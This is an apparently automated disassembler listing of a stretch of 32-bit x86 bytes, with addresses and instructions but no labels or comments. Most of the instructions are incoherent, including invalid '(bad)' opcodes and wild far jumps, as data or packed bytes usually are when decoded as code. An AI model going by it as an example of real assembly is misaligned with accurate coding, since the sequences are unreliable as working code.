  414283:	pop    edi
  414284:	enter  0xf313,0xf7
  414288:	jle    0x4142a8
  41428a:	or     BYTE PTR [eax-0x38],dl
  41428d:	psrld  mm5,0x89
  414291:	mov    WORD PTR [esi],cs
  414293:	inc    eax
  414294:	enter  0x622f,0xe5
  414298:	add    edx,DWORD PTR [eax-0x4be096c3]
  41429e:	mov    bl,0xe5
  4142a0:	add    ebx,DWORD PTR [ebp+0x50029a48]
  4142a6:	bound  ebp,QWORD PTR [eax]
  4142a8:	(bad)  
  4142a9:	mov    ah,0x6e
  4142ab:	out    0x3,al
  4142ad:	nop
  4142ae:	ror    DWORD PTR [edi+0x3e],0x90
  4142b2:	adc    DWORD PTR [ecx+0x1f],ebx
  4142b5:	inc    esp
  4142b6:	mov    bl,0xe5
  4142b8:	add    ecx,DWORD PTR [ebp+0x64236548]
  4142be:	jb     0x4142a5
  4142c0:	enter  0xd704,0x81
  4142c4:	add    dl,BYTE PTR [eax+0x65c0e4b2]
  4142ca:	adc    DWORD PTR [ecx-0x1a4cabe0],ebx
  4142d0:	add    edx,DWORD PTR [ecx+0x6c90bfe2]
  4142d6:	outs   dx,BYTE PTR ds:[esi]
  4142d7:	out    0x3,al
  4142d9:	nop
  4142da:	arpl   WORD PTR [ebx+edi*4-0x58],di
  4142de:	enter  0x980e,0x0
  4142e2:	add    BYTE PTR [eax],al
  4142e4:	add    BYTE PTR [eax],al
  4142e6:	push   edi
  4142e7:	jns    0x4d75c296
  4142ed:	pushf  
  4142ee:	push   edi
  4142ef:	jno    0x477ad519
  4142f5:	sbb    DWORD PTR [ebp*4+0x194f8ef2],ebx
  4142fc:	cmp    eax,0x830f577c
  414301:	gs mov al,0x6e
  414304:	or     eax,0x5e7293e9
  414309:	outs   dx,BYTE PTR ds:[esi]
  41430a:	and    dh,dl
  41430c:	push   edx
  41430d:	call   0x9740f5a5
  414312:	shl    DWORD PTR [edx+0x6e709def],1
  414318:	or     eax,0xb8bf93e9
  41431d:	pop    ecx
  41431e:	je     0x4142be
  414320:	dec    esi
  414321:	jmp    0x956b8974
  414326:	xchg   esp,eax
  414327:	mov    dl,0xe
  414329:	jmp    0x6eb0:0x5def6740
  414330:	or     eax,0xba0f93e9
  414335:	int    0xb7
  414337:	adc    edi,ebp
  414339:	jmp    0x12047eda
  41433e:	sub    dl,ah
  414340:	out    dx,al
  414341:	(bad)  
  414342:	adc    dl,dh
  414344:	(bad)  
  414345:	imul   ebp,edi,0x5
  414348:	out    dx,eax
  414349:	out    dx,al
  41434a:	add    BYTE PTR [eax],al
  41434c:	add    BYTE PTR [eax],al
  41434e:	add    BYTE PTR ds:0xd6e6f2b0,cl
  414354:	cmp    cl,BYTE PTR [edx-0x10eeaffb]
  41435a:	jmp    0xe9d37a8b
  41435f:	xchg   ebx,eax
  414360:	mov    dl,0x83
  414362:	add    bh,ch
  414364:	in     eax,dx
  414365:	mov    edi,0x84f7d6f4
  41436a:	test   BYTE PTR [ebp+0x79ffefda],bl
  414370:	or     DWORD PTR [ecx+0x5e746855],edi
  414376:	(bad)  
  414377:	(bad)  [edi-0x4b86feae]
  41437d:	add    DWORD PTR [esi-0x4b0e4954],esi
  414383:	dec    ebp
  414384:	fsubr  st,st(7)
  414386:	jmp    FWORD PTR [ecx+0x9]
  414389:	mov    ecx,0x4e685980
  41438e:	add    BYTE PTR [esi+0x285c2a3f],dh
  414394:	mov    ah,0xe
  414396:	add    ebp,DWORD PTR [eax+eiz*8-0xf]
  41439a:	mov    ah,0x9d
  41439c:	(bad)  
  41439e:	(bad)  
  41439f:	cmp    DWORD PTR [ebp-0x50620022],esi
  4143a5:	push   edx
  4143a6:	add    DWORD PTR [ecx],ebp
  4143a8:	mov    ah,0x3f
  4143aa:	mov    esi,DWORD PTR [edx-0x492f8315]
  4143b0:	clc    
  4143b1:	mov    al,al
  4143b3:	add    BYTE PTR [eax],al
  4143b5:	add    BYTE PTR [eax],al
  4143b7:	add    BYTE PTR [esi],al
  4143b9:	xor    esi,DWORD PTR [eax-0xc]
  4143bc:	xchg   esi,eax
  4143bd:	clc    
  4143be:	enter  0xdd44,0xbf
  4143c2:	adc    ah,bh
  4143c4:	xchg   esi,eax
  4143c5:	clc    
  4143c6:	add    BYTE PTR [ebp-0x15],0x8e
  4143ca:	mov    DWORD PTR [ecx+ebp*8-0x274f14d],ebx
  4143d1:	scas   eax,DWORD PTR es:[edi]
  4143d2:	cmp    ch,cl
  4143d4:	or     eax,0xc6fff100
  4143d9:	cmp    eax,0x3da6015b
  4143de:	dec    ebx
  4143df:	add    dl,BYTE PTR [eax-0x64f713a6]
  4143e5:	dec    ecx
  4143e6:	or     eax,0x3e823455
  4143eb:	and    al,0x5c
  4143ed:	mov    ah,0x21
  4143ef:	fs add eax,0xac747420
  4143f5:	aad    0xd5
  4143f7:	jg     0x8742786c
  4143fd:	addr16 dec esp
  4143ff:	add    al,0x51
  414401:	cmp    dh,dl
  414403:	or     BYTE PTR [eax-0x6e],bl
  414406:	ss and al,0xd4
  414409:	test   BYTE PTR [ecx-0x6c],dh
  41440c:	nop
  41440d:	sbb    DWORD PTR [ebx],ecx
  41440f:	xchg   esp,edx
  414411:	std    
  414412:	dec    edx
  414413:	mov    ecx,esp
  414415:	cmc    
  414416:	dec    edx
  414417:	xchg   DWORD PTR [edi],edx
  414419:	lea    ecx,[edx]
  41441b:	add    BYTE PTR [eax],al
  41441d:	add    BYTE PTR [eax],al
  41441f:	add    BYTE PTR [eax],al
  414421:	nop
  414422:	sahf   
  414423:	das    
  414424:	add    DWORD PTR [ecx],ebx
  414426:	pop    ebp
  414427:	cmovs  ebx,DWORD PTR [ebx]
  41442a:	pop    eax
  41442b:	sti    
  41442c:	xchg   ah,dl
  41442e:	mov    ebp,0xef18813a
  414433:	dec    ecx
  414434:	or     ebx,DWORD PTR ds:0x90c02e95
  41443a:	sbb    DWORD PTR [ebx],ecx
  41443c:	xchg   DWORD PTR [ebp+edi*8+0x36],ecx
  414440:	jmp    0xbff3c8f5
  414445:	icebp  
  414446:	sbb    cl,dl
  414448:	adc    edi,DWORD PTR [esp+edi*1]
  41444b:	das    
  41444c:	add    BYTE PTR [ebx],cl
  41444e:	shl    DWORD PTR [ebx+0x4c],0xac
  414452:	pop    ebp
  414453:	jo     0x41441c
  414455:	inc    ebp
  414456:	and    BYTE PTR [ebp-0x6],dl
  414459:	mov    ecx,0xbffdddbb
  41445e:	mov    cl,0x7c
  414460:	aas    
  414461:	ins    BYTE PTR es:[edi],dx
  414462:	bound  esp,QWORD PTR [esi-0x279d6d1d]
  414468:	dec    esp
  414469:	xchg   esp,eax
  41446a:	popa   
  41446b:	shr    dh,0x3b
  41446e:	test   al,0x25
  414470:	add    al,0x9
  414472:	or     DWORD PTR ss:[eax],esi
  414475:	(bad)  
  414476:	push   cs
  414477:	in     eax,0x78
  414479:	hlt    
  41447a:	(bad)  
  41447b:	and    eax,0x5d6d47b
  414480:	jp     0x41444d
  414482:	mov    dl,0x64
  414484:	mov    edi,0x0
  414489:	add    BYTE PTR [edx+esi*1-0xd769d62],bl
  414490:	or     al,BYTE PTR [edx]
  414492:	adc    DWORD PTR [ebx],edx
  414494:	xchg   DWORD PTR [ecx],ebp
  414496:	xchg   ecx,eax
  414497:	lock jnp 0x414509
  41449a:	je     0x41450a
  41449c:	out    0x3,al
  41449e:	nop
  41449f:	jo     0x41450f
  4144a1:	aas    
  4144a2:	je     0x41446a
  4144a4:	jle    0x4144d5
  4144a6:	ins    BYTE PTR es:[edi],dx
  4144a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a8:	mov    bl,0x33
  4144aa:	sub    eax,0x27280147
  4144af:	push   cs
  4144b0:	in     eax,0xf4
  4144b2:	in     eax,0xf3
  4144b4:	inc    edi
  4144b5:	(bad)  
  4144b6:	ins    BYTE PTR es:[edi],dx
  4144b7:	outs   dx,BYTE PTR ds:[esi]
  4144b8:	out    0x3,al
  4144ba:	nop
  4144bb:	mov    ebp,0x9eb0736f
  4144c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144c1:	add    esp,DWORD PTR [ebp+0xd]
  4144c4:	push   ecx
  4144c5:	pop    ds
  4144c6:	push   esp
  4144c7:	mov    bl,0xe5
  4144c9:	add    edx,DWORD PTR [ecx-0x5370e819]
  4144cf:	outs   dx,BYTE PTR ds:[esi]
  4144d0:	out    0x3,al
  4144d2:	nop
  4144d3:	cmp    DWORD PTR [esp+eax*8],edi
  4144d6:	sbb    al,0xd7
  4144d8:	xchg   ecx,eax
  4144d9:	add    dl,BYTE PTR [eax+0x77010eb2]
  4144df:	(bad)  
  4144e0:	out    dx,al
  4144e1:	out    dx,al
  4144e2:	(bad)  
  4144e3:	cmc    
  4144e4:	dec    esp
  4144e5:	jo     0x41452f
  4144e7:	(bad)  
  4144e8:	and    ah,BYTE PTR [edx]
  4144ea:	aad    0xbf
  4144ec:	mov    cl,BYTE PTR [edi+0x0]
  4144f2:	add    BYTE PTR [edx+esi*4+0xe7d0c0e],cl
  4144f9:	out    dx,eax
  4144fa:	mov    BYTE PTR [ebx-0x6c166cca],0xb2
  414501:	mov    DWORD PTR [ecx-0x30ce4838],ebp
  414507:	aas    
  414508:	pxor   mm3,QWORD PTR [edx+ecx*8]
  41450c:	cmp    DWORD PTR [edx-0x3b],ecx
  41450f:	shl    DWORD PTR ds:0xb28c7d87,cl
  414515:	push   cs
  414516:	(bad)  
  414517:	enter  0x5ed6,0xa8
  41451b:	sub    al,0xb0
  41451d:	pop    esi
  41451e:	jle    0x4144a8
  414520:	(bad)  
  414521:	pop    esi
  414522:	jbe    0x4144af
  414524:	mov    esi,0xa4dfd4ef
  414529:	dec    esi
  41452a:	jmp    0xe88289d1
  41452f:	add    BYTE PTR [ecx+ecx*2-0x15],0x4c
  414534:	in     eax,dx
  414535:	add    eax,0xe5b34be2
  41453a:	push   0x48
  41453c:	mov    esi,0x3293ac84
  414541:	cmc    
  414542:	popf   
  414543:	enter  0x83df,0xa5
  414547:	test   eax,0xa0efbd83
  41454d:	in     eax,0xbd
  41454f:	ror    BYTE PTR [esi],cl
  414551:	out    dx,eax
  414552:	bound  eax,QWORD PTR [eax-0x2a]
  414555:	inc    edx
  414556:	pop    esp
  414557:	add    BYTE PTR [eax],al
  414559:	add    BYTE PTR [eax],al
  41455b:	add    al,bh
  41455d:	aad    0xce
  41455f:	add    cl,ch
  414561:	mov    al,0xe
  414563:	cmp    eax,DWORD PTR [ebx-0x3416755f]
  414569:	out    dx,eax
  41456a:	lock jmp esp
  41456d:	pusha  
  41456e:	ins    DWORD PTR es:[edi],dx
  41456f:	inc    esp
  414570:	test   eax,0x9d244a3b
  414575:	pop    edi
  414576:	aam    0xf2
  414578:	mov    esi,0x954484ef
  41457d:	jbe    0x414504
  41457f:	dec    esp
  414580:	test   DWORD PTR [edx-0x79],esp
  414583:	xchg   ebp,esp
  414585:	scas   eax,DWORD PTR es:[edi]
  414586:	push   cs
  414587:	add    ah,ch
  414589:	xor    ebp,DWORD PTR [edx]
  41458b:	shr    BYTE PTR [ecx-0x50],0xe
  41458f:	cmp    eax,DWORD PTR [ecx-0x5f]
  414592:	mov    bl,bl
  414594:	or     al,0xf1
  414596:	lock jmp DWORD PTR [eax+eiz*2+0x6d]
  41459b:	inc    esp
  41459c:	imul   ebx,DWORD PTR [edi-0x22],0x84f10efd
  4145a3:	inc    esp
  4145a4:	push   ebp
  4145a5:	jo     0x41452c
  4145a7:	dec    esp
  4145a8:	push   ebp
  4145a9:	jl     0x414532
  4145ab:	xchg   ebp,esp
  4145ad:	scas   eax,DWORD PTR es:[edi]
  4145ae:	push   cs
  4145af:	add    BYTE PTR [ebx+esi*1-0x4fc63fd6],bh
  4145b6:	push   cs
  4145b7:	cmp    esi,DWORD PTR [ecx-0x3d]
  4145ba:	or     bh,bh
  4145bc:	and    al,0x60
  4145be:	ins    DWORD PTR es:[edi],dx
  4145bf:	inc    esp
  4145c0:	add    BYTE PTR [eax],al
  4145c2:	add    BYTE PTR [eax],al
  4145c4:	add    BYTE PTR [ecx],ch
  4145c6:	add    eax,0xb7498daf
  4145cb:	out    0xa7,eax
  4145cd:	mov    esp,0xc26af0f0
  4145d2:	pop    esi
  4145d3:	outs   dx,DWORD PTR ds:[esi]
  4145d4:	repnz scas al,BYTE PTR es:[edi]
  4145d6:	lock arpl bx,bp
  4145d9:	or     ch,0xfc
  4145dc:	call   DWORD PTR [eax+0x50fc6fa4]
  4145e2:	sbb    DWORD PTR [eax],ecx
  4145e4:	add    al,0x51
  4145e6:	sbb    DWORD PTR [ecx],ebx
  4145e8:	add    al,0x51
  4145ea:	sbb    DWORD PTR [esp+eax*1],ebp
  4145ed:	push   ecx
  4145ee:	sbb    DWORD PTR [ecx],esi
  4145f0:	add    edx,DWORD PTR [ecx+0x19]
  4145f3:	ja     0x4145fb
  4145f5:	push   ecx
  4145f6:	sbb    esp,eax
  4145f8:	push   es
  4145f9:	push   ecx
  4145fa:	sbb    DWORD PTR [edi-0x4de6aefa],esp
  414600:	push   es
  414601:	push   ecx
  414602:	sbb    DWORD PTR [esi],ebx
  414604:	add    eax,0x4e71951
  414609:	rcr    DWORD PTR [ecx],1
  41460b:	or     al,BYTE PTR [esi]
  41460d:	rcr    DWORD PTR [ecx],1
  41460f:	in     eax,0x5
  414611:	rcr    DWORD PTR [ecx],1
  414613:	add    BYTE PTR [esi],0xd1
  414616:	sbb    ecx,esi
  414618:	add    al,0xd1
  41461a:	sbb    DWORD PTR [edx+0x5],ebp
  41461d:	rcr    DWORD PTR [ecx],1
  41461f:	cs or  cl,dl
  414622:	sbb    DWORD PTR [ebx-0x2fe62ef8],edx
  414628:	or     BYTE PTR [eax],al
  41462a:	add    BYTE PTR [eax],al
  41462c:	add    BYTE PTR [eax],al
  41462e:	rcr    DWORD PTR [ecx],1
  414630:	add    al,0x3
  414632:	rcr    DWORD PTR [ecx],1
  414634:	mov    dl,0x4
  414636:	rcr    DWORD PTR [ecx],1
  414638:	push   ds
  414639:	sti    
  41463a:	rcr    BYTE PTR [ecx],1
  41463c:	dec    esi
  41463d:	add    ecx,edx
  41463f:	sbb    ecx,esp
  414641:	add    edx,ecx
  414643:	sbb    DWORD PTR [ecx+0x6219d109],eax
  414649:	or     ecx,edx
  41464b:	sbb    edi,eax
  41464d:	push   cs
  41464e:	push   ecx
  41464f:	sbb    esi,esi
  414651:	or     edx,DWORD PTR [ecx+0x19]
  414654:	mov    dh,0x9
  414656:	push   ecx
  414657:	sbb    edi,ecx
  414659:	or     DWORD PTR [ecx-0x4e],edx
  41465c:	in     eax,0x19
  41465e:	pushf  
  41465f:	jno    0x414646
  414661:	call   0xf226b801
  414666:	mov    esi,DWORD PTR [ecx-0x1b]
  414669:	mov    bl,0x89
  41466b:	jno    0x414652
  41466d:	mov    DWORD PTR [ebp-0x6b0e1a8f],ebx
  414673:	jno    0x41465a
  414675:	sbb    eax,0x4ee5718d
  41467a:	test   DWORD PTR [ecx-0x1b],esi
  41467d:	popa   
  41467e:	popf   
  41467f:	jno    0x414666
  414681:	es xchg ebp,eax
  414683:	jno    0x41466a
  414685:	xor    DWORD PTR [ebp-0x7d651a8f],ecx
  41468b:	jno    0x414672
  41468d:	clc    
  41468e:	mov    eax,ds:0x18e573
  414693:	add    BYTE PTR [eax],al
  414695:	add    BYTE PTR [eax],al
  414697:	mov    ds:0xa25be573,al
  41469c:	jae    0x414683
  41469e:	sub    ah,BYTE PTR [edx-0x7dcc1a8d]
  4146a4:	jae    0x41468b
  4146a6:	cmp    al,0x82
  4146a8:	jae    0x41468f
  4146aa:	cmp    al,0x8a
  4146ac:	jae    0x414693
  4146ae:	pop    ds
  4146af:	(bad)  
  4146b0:	jae    0x414697
  4146b2:	sbb    esi,DWORD PTR [ebp+0x73]
  4146b5:	in     eax,0xc3
  4146b7:	inc    esi
  4146b8:	jae    0x41469f
  4146ba:	fst    QWORD PTR [eax+0x37c4e573]
  4146c0:	jae    0x4146a7
  4146c2:	jmp    0x4146ee
  4146c4:	jae    0x4146ab
  4146c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146c7:	sub    esi,DWORD PTR [ebx-0x1b]
  4146ca:	mov    eax,ds:0x98e5731e
  4146cf:	adc    eax,0xaa64e573
  4146d4:	jae    0x4146bb
  4146d6:	mov    DWORD PTR [edx-0x5816f18d],ebp
  4146dc:	or     cl,BYTE PTR [esi-0x17]
  4146df:	aas    
  4146e0:	mov    bl,0x4d
  4146e2:	jmp    0xe98f5042
  4146e7:	cwde   
  4146e8:	into   
  4146e9:	dec    ebp
  4146ea:	jmp    0xe98f161b
  4146ef:	nop
  4146f0:	aad    0x4d
  4146f2:	jmp    0xe98f1d1e
  4146f7:	hlt    
  4146f8:	aad    0x4d
  4146fa:	jmp    0x4146ff
  4146ff:	add    BYTE PTR [eax+edx*8+0x4d],cl
  414703:	jmp    0xe98f1749
  414708:	push   es
  414709:	iret   
  41470a:	dec    ebp
  41470b:	jmp    0xe98f1819
  414710:	ds push es
  414712:	dec    esi
  414713:	jmp    0xe98f5043
  414718:	inc    edx
  414719:	fimul  DWORD PTR [ebp-0x17]
  41471c:	xchg   ebx,eax
  41471d:	or     DWORD PTR ds:0x9ae97ea,ecx
  414723:	out    0x8e,eax
  414725:	mov    edx,0xb69af305
  41472a:	add    DWORD PTR [ebx],esi
  41472c:	fidivr DWORD PTR [eax-0x5b7b0701]
  414732:	inc    esp
  414733:	cli    
  414734:	jg     0x4146db
  414736:	sbb    dh,bl
  414738:	stos   DWORD PTR es:[edi],eax
  414739:	mov    eax,ds:0xabaae214
  41473e:	adc    edx,edx
  414740:	call   0x2ea7:0x95cc12a6
  414747:	or     BYTE PTR [edx],dh
  414749:	shr    DWORD PTR [ebx+ecx*1],cl
  41474c:	xor    dl,bl
  41474e:	sub    ecx,DWORD PTR [edx]
  414750:	sub    ah,dl
  414752:	sub    BYTE PTR [esi],al
  414754:	and    al,0xd0
  414756:	and    eax,0x2817a000
  41475b:	sub    DWORD PTR [ebx-0x6bd3d9e4],esp
  414761:	sbb    BYTE PTR [edx],ah
  414763:	dec    edx
  414764:	add    BYTE PTR [eax],al
  414766:	add    BYTE PTR [eax],al
  414768:	add    BYTE PTR [ebx],dh
  41476a:	jnp    0x4147b0
  41476c:	dec    edx
  41476d:	and    edi,DWORD PTR [ebx+0x44]
  414770:	xor    cl,cl
  414772:	jp     0x414793
  414774:	xor    bh,BYTE PTR [edx-0x43cac400]
  41477a:	(bad)  
  41477b:	cmp    DWORD PTR [esi],esi
  41477d:	push   cs
  41477e:	or     eax,0x8d23a38
  414783:	xor    eax,0x447b053b
  414788:	dec    edx
  414789:	repz jp 0x4147bf
  41478c:	ds jbe 0x4147fd
  41478f:	das    
  414790:	inc    edx
  414791:	jp     0x41480d
  414793:	dec    ebx
  414794:	inc    esi
  414795:	outs   dx,BYTE PTR ds:[esi]
  414796:	scas   al,BYTE PTR es:[edi]
  414797:	inc    esi
  414798:	dec    ecx
  414799:	sbb    DWORD PTR [edi],edi
  41479b:	sbb    al,BYTE PTR [ecx+0x79]
  41479e:	add    bl,BYTE PTR [ecx+eax*2]
  4147a1:	jns    0x414779
  4147a3:	sbb    eax,DWORD PTR [ecx+0x69]
  4147a6:	test   BYTE PTR [ebx],bl
  4147a8:	inc    ecx
  4147a9:	imul   ebx,DWORD PTR [ecx+0x1b],0x19107941
  4147b0:	inc    ecx
  4147b1:	jns    0x414810
  4147b3:	sbb    al,0x41
  4147b5:	imul   edx,edx,0xd269411d
  4147bb:	sbb    eax,0x2ded3941
  4147c0:	inc    ecx
  4147c1:	cmp    ebp,ebp
  4147c3:	sub    eax,0x1dbe2941
  4147c8:	inc    ecx
  4147c9:	sub    edx,ebp
  4147cb:	sbb    al,0x41
  4147cd:	add    BYTE PTR [eax],al
  4147cf:	add    BYTE PTR [eax],al
  4147d1:	add    BYTE PTR [ecx],bh
  4147d3:	sbb    ebx,DWORD PTR [ebx]
  4147d5:	inc    ecx
  4147d6:	cmp    esp,ebx
  4147d8:	sbb    al,BYTE PTR [ecx-0x70]
  4147db:	sbb    DWORD PTR [eax+0x14],esp
  4147de:	rcr    DWORD PTR [ecx],1
  4147e0:	mov    bh,0x18
  4147e2:	push   ecx
  4147e3:	sbb    DWORD PTR ds:0x4b195117,edx
  4147e9:	pop    ss
  4147ea:	push   ecx
  4147eb:	sbb    DWORD PTR [ecx],ebp
  4147ed:	pop    ss
  4147ee:	push   ecx
  4147ef:	sbb    DWORD PTR [edi+0x17],edi
  4147f2:	push   ecx
  4147f3:	sbb    DWORD PTR [ecx+0x17],esp
  4147f6:	push   ecx
  4147f7:	sbb    esi,ebp
  4147f9:	push   ss
  4147fa:	push   ecx
  4147fb:	sbb    DWORD PTR [ebx],esi
  4147fd:	adc    eax,0x15331951
  414802:	push   ecx
  414803:	sbb    esp,edx
  414805:	and    BYTE PTR [ecx+0x19],dl
  414808:	aam    0x20
  41480a:	push   ecx
  41480b:	sbb    DWORD PTR [ebp+edx*1+0x15a61951],ebx
  414812:	push   ecx
  414813:	sbb    DWORD PTR [edx],edx
  414815:	sbb    BYTE PTR [ecx+0x19],dl
  414818:	pop    esp
  414819:	sbb    BYTE PTR [ecx+0x19],dl
  41481c:	nop
  41481d:	sbb    BYTE PTR [ecx+0x19],dl
  414820:	adc    al,0x22
  414822:	rcr    DWORD PTR [ecx],1
  414824:	call   0xe15b194a
  414829:	and    ecx,edx
  41482b:	sbb    ebp,esi
  41482d:	and    ecx,edx
  41482f:	sbb    DWORD PTR [esi+0x22],ecx
  414832:	rcr    DWORD PTR [ecx],1
  414834:	inc    edx
  414835:	and    al,BYTE PTR [eax]
  414837:	add    BYTE PTR [eax],al
  414839:	add    BYTE PTR [eax],al
  41483b:	rcr    DWORD PTR [ecx],1
  41483d:	dec    edi
  41483e:	and    dl,cl
  414840:	sbb    DWORD PTR [edi+0x22],ecx
  414843:	rcr    DWORD PTR [ecx],1
  414845:	dec    edi
  414846:	and    dl,cl
  414848:	sbb    esi,edx
  41484a:	and    cl,dl
  41484c:	sbb    esi,edx
  41484e:	and    cl,dl
  414850:	sbb    DWORD PTR [ecx],edi
  414852:	pop    ds
  414853:	rcr    DWORD PTR [ecx],1
  414855:	int3   
  414856:	pop    ds
  414857:	shl    DWORD PTR [edx+0x7187d8e5],1
  41485d:	in     eax,0xae
  41485f:	jg     0x4148d2
  414861:	in     eax,0x0
  414863:	jb     0x4148d6
  414865:	in     eax,0x82
  414867:	cld    
  414868:	(bad)
  41486b:	nop
  41486c:	cmp    ebp,DWORD PTR [ecx-0x18]
  41486f:	mov    edi,0x903e5b1
  414874:	push   ds
  414875:	or     DWORD PTR [eax-0x11],edx
  414878:	push   es
  414879:	in     eax,0x80
  41487b:	push   esp
  41487c:	into   
  41487d:	jmp    0xc1b75a3e
  414882:	repz aam 0x32
  414885:	xchg   ecx,eax
  414886:	out    0x7b,eax
  414888:	pop    es
  414889:	xchg   esp,eax
  41488a:	push   esi
  41488b:	pop    esi
  41488c:	cmp    edi,DWORD PTR [ecx]
  41488e:	call   0x426f9f6
  414893:	sub    ebx,0x3b45b3e3
  414899:	out    dx,al
  41489a:	mov    ss,WORD PTR [esi+0x7]
  41489d:	jl     0x41484b
  41489f:	add    BYTE PTR [eax],al
  4148a1:	add    BYTE PTR [eax],al
  4148a3:	add    BYTE PTR [edi],dl
  4148a5:	add    sp,bp
  4148a8:	push   cs
  4148a9:	or     WORD PTR [eax+0x17],cx
  4148ad:	addr16 add eax,esi
  4148b0:	push   cs
  4148b1:	addr16 or esp,esp
  4148b4:	push   ss
  4148b5:	ja     0x4148b8
  4148b7:	clc    
  4148b8:	push   cs
  4148b9:	xchg   edi,eax
  4148ba:	or     DWORD PTR [eiz*2-0x6aa5e80f],ebx
  4148c1:	adc    BYTE PTR [ecx],bl
  4148c3:	add    eax,0x6f8e07ea
  4148c8:	mov    BYTE PTR [edx-0x49b2791b],dh
  4148ce:	popa   
  4148cf:	popa   
  4148d0:	cwde   
  4148d1:	mov    dl,0xe5
  4148d3:	xchg   BYTE PTR [eax-0x4a],dl
  4148d6:	push   cs
  4148d7:	ins    DWORD PTR es:[edi],dx
  4148d8:	sbb    DWORD PTR [ebx+0x3718e90e],edi
  4148de:	sub    cl,ch
  4148e0:	xchg   edx,eax
  4148e1:	mov    dl,0xe
  4148e3:	and    al,dh
  4148e5:	into   
  4148e6:	outs   dx,BYTE PTR ds:[esi]
  4148e7:	call   0xe1bafb7f
  4148ec:	push   ss
  4148ed:	out    dx,al
  4148ee:	(bad)  
  4148ef:	jne    0x414902
  4148f1:	mov    ebx,0xee16e90e
  4148f6:	je     0x4148e6
  4148f8:	test   eax,0x9bb0e515
  4148fd:	mov    dl,0xe
  4148ff:	neg    BYTE PTR [edi+ebp*2+0x16]
  414903:	jmp    0x0:0xc96f33d4
  41490a:	add    BYTE PTR [eax],al
  41490c:	add    BYTE PTR [ebx-0x7c3ab5d3],dl
  414912:	mov    bh,0xb7
  414914:	scas   al,BYTE PTR es:[edi]
  414915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414916:	sub    eax,0xb76bc54a
  41491b:	mov    bh,0xae
  41491d:	cdq    
  41491e:	sub    eax,0xb2f3c592
  414923:	push   cs
  414924:	jmp    0x29a3734f
  414929:	xchg   esp,eax
  41492a:	mov    bh,0x49
  41492c:	lods   al,BYTE PTR ss:[esi]
  41492e:	test   BYTE PTR [edi],ch
  414930:	and    al,0xe6
  414932:	jae    0x414992
  414934:	jo     0x414906
  414936:	into   
  414937:	bound  eax,QWORD PTR [ecx-0x17008f2c]
  41493d:	add    al,0x6e
  41493f:	sub    bl,BYTE PTR ds:0x392a6e1d
  414945:	adc    eax,0xaff92a66
  41494a:	ret    0x6d81
  41494d:	jo     0x4148f8
  41494f:	or     eax,0x646293e9
  414954:	add    BYTE PTR [ecx],bh
  414956:	cmp    bl,BYTE PTR [edx+0xeaebd24]
  41495c:	add    BYTE PTR [edx-0x32fd1a07],dh
  414962:	scas   al,BYTE PTR es:[edi]
  414963:	push   cs
  414964:	mov    eax,ecx
  414966:	aaa    
  414967:	bound  esp,QWORD PTR [ecx+edx*4]
  41496a:	xor    esp,ebx
  41496c:	jne    0x414994
  41496e:	xlat   BYTE PTR ds:[ebx]
  41496f:	bnd jmp 0x414975
  414975:	add    al,dh
  414977:	mov    eax,0x2282000e
  41497c:	sub    bl,BYTE PTR [eax+ebp*8-0x50]
  414980:	push   cs
  414981:	mov    ebp,DWORD PTR [ecx+edi*4]
  414984:	test   ecx,eax
  414986:	repnz out dx,al
  414988:	scas   al,BYTE PTR es:[edi]
  414989:	call   0x22f7583
  41498e:	pusha  
  41498f:	jb     0x4149bb
  414991:	xor    dh,ch
  414993:	jg     0x4149e0
  414995:	or     al,0x78
  414997:	push   esi
  414998:	or     eax,0x87af9983
  41499d:	test   ch,dl
  41499f:	dec    esp
  4149a0:	push   cs
  4149a1:	add    BYTE PTR [ecx-0x3cba4649],ch
  4149a7:	in     eax,dx
  4149a8:	out    0x12,al
  4149aa:	cmp    cl,BYTE PTR [esi-0x11]
  4149ad:	mov    BYTE PTR [ebp+0x12],ch
  4149b0:	aaa    
  4149b1:	psadbw mm7,QWORD PTR [ecx+0x12]
  4149b5:	femms  
  4149b7:	clc    
  4149b8:	add    BYTE PTR [edi-0x30f2594c],dh
  4149be:	push   0xffffffef
  4149c0:	xchg   BYTE PTR [ebp+eax*4+0x79000e9a],al
  4149c7:	xor    eax,0xadd1248a
  4149cc:	push   cs
  4149cd:	add    dl,ah
  4149cf:	sub    ebp,DWORD PTR [edx]
  4149d1:	push   eax
  4149d2:	nop
  4149d3:	sbb    cl,BYTE PTR [ebx]
  4149d5:	add    BYTE PTR [ecx],bl
  4149d7:	mov    cs,edi
  4149d9:	iret   
  4149da:	add    BYTE PTR [eax],al
  4149dc:	add    BYTE PTR [eax],al
  4149de:	add    BYTE PTR [eax+0x14890b19],dl
  4149e4:	out    dx,al
  4149e5:	push   DWORD PTR ds:[edi]
  4149e8:	sbb    cl,BYTE PTR [eax]
  4149ea:	mov    edi,0xb3cf8e19
  4149ef:	nop
  4149f0:	sbb    DWORD PTR [ebx],ecx
  4149f2:	xchg   esp,edx
  4149f4:	lods   eax,DWORD PTR ds:[esi]
  4149f5:	push   ss
  4149f6:	xchg   DWORD PTR [esi+esi*4],eax
  4149f9:	jp     0x4149fb
  4149fb:	nop
  4149fc:	sbb    DWORD PTR [eax-0x5c2567bd],eax
  414a02:	add    eax,ebx
  414a04:	les    ecx,FWORD PTR [ecx+eiz*1-0x31]
  414a08:	xchg   edx,eax
  414a09:	outs   dx,DWORD PTR ds:[esi]
  414a0a:	and    al,0x8
  414a0c:	sbb    cl,BYTE PTR [ebx]
  414a0e:	add    BYTE PTR [ebx],bl
  414a10:	push   edi
  414a11:	add    edi,DWORD PTR [edi-0x3b17ff18]
  414a17:	or     DWORD PTR [esi-0x31],edx
  414a1a:	and    ebx,DWORD PTR [ecx]
  414a1c:	mov    cs,edi
  414a1e:	mov    edx,DWORD PTR [eax+0x55890b19]
  414a24:	add    edx,ecx
  414a26:	call   0x880d42c0
  414a2b:	adc    al,0xee
  414a2d:	jle    0x414a2f
  414a2f:	nop
  414a30:	sbb    DWORD PTR [edx-0x5da577bd],eax
  414a36:	pop    ss
  414a37:	jae    0x414a8d
  414a39:	add    DWORD PTR [esp+esi*4-0x6ffff577],0xffffff80
  414a41:	enter  0xbf,0x0
  414a45:	add    BYTE PTR [eax],al
  414a47:	add    BYTE PTR [eax+0xc],ch
  414a4a:	jmp    0x9083:0xee9509c4
  414a51:	sbb    DWORD PTR [ebx],ecx
